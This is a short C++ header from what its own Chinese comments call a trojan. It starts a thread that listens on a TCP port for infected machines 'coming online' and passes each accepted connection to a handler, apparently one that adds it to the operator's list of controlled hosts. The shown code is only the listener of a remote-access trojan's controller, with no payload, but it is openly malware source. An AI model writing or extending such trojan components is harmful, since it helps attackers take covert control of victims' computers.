#pragma once
#include "InitSocket.h"

//////////////////////////////////////////////////////////////////////////
//木马线程初始化入口
//////////////////////////////////////////////////////////////////////////
BOOL TrojanEntry(void)
{
	//上线端口监听
	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)ListenProc,(LPVOID)ListenPort,NULL,NULL);

	return TRUE;
}



//////////////////////////////////////////////////////////////////////////
//上线端口监听
//////////////////////////////////////////////////////////////////////////
BOOL ListenProc(int port)
{
	WSADATA	wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);

	SOCKET	sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	SOCKADDR_IN	addr;
	SOCKADDR_IN newAddr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = ADDR_ANY;

	int ret = 0;
	ret = bind(sockfd,(sockaddr*)&addr,sizeof(addr));
	if (ret == SOCKET_ERROR)
	{
		return FALSE;
	}
	ret = listen(sockfd,PCNUM);
	if (ret == SOCKET_ERROR)
	{
		return FALSE;
	}

	while (TRUE)
	{
		int dwSize = sizeof(SOCKADDR_IN);
		SOCKET newSocket = accept(sockfd,(LPSOCKADDR)&newAddr,&dwSize);
		if (newSocket == INVALID_SOCKET)
		{
			continue;
		}
		InsertNewItem(newSocket,newAddr);
	}

}